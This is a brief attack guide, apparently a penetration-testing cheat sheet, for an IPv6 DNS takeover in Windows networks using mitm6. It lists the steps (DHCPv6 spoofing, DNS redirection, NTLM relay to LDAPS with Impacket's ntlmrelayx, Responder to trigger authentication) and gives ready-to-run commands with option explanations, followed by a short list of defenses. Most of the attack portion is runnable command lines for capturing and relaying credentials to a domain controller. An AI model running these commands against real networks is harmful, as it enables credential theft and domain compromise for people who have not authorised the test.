# IPv6 DNS Takeover via mitm6

Exploit IPv6 to capture credentials via DNS spoofing. Works when IPv6 is enabled but not properly secured (common in Windows environments).

## How It Works

1. Send DHCPv6 advertisement to appear as legitimate IPv6 server
2. Redirect DNS requests to attacker's machine
3. Relay NTLM authentication to LDAP/SMB
4. Compromise domain controller or dump credentials

## Prerequisites

- IPv6 enabled on network (usually default in Windows)
- mitm6 tool installed
- ntlmrelayx.py (Impacket)
- Network access to target subnet

## Attack Steps

### Terminal 1 - Start mitm6 (DHCPv6 Spoofing)

```bash
$ sudo mitm6 -i eth0 -d
```

**Options:**
- `-i eth0`: Network interface to listen on
- `-d`: Domain name to intercept

### Terminal 2 - Start NTLM Relay (LDAPS)

```bash
$ impacket-ntlmrelayx.py -6 -t ldaps://192.168.1.100 \
  -wh fakewpad.example.local -l lootme
```

**Options:**
- `-6`: IPv6 mode
- `-t ldaps://`: Target domain controller (LDAPS)
- `-wh`: WPAD hostname (for credential capture)
- `-l`: Directory to dump loot

### Terminal 3 - Trigger Authentication

Wait for user/service to authenticate or trigger via:
```bash
$ responder -I eth0 -dvPv
```

## Defense

- **Disable IPv6** if not needed
- **Enable DHCPv6 Snooping** on switches
- **Network Segmentation** to limit IPv6 traffic
- **Monitor** IPv6 DHCP activity
- **Require SMB Signing** on all systems

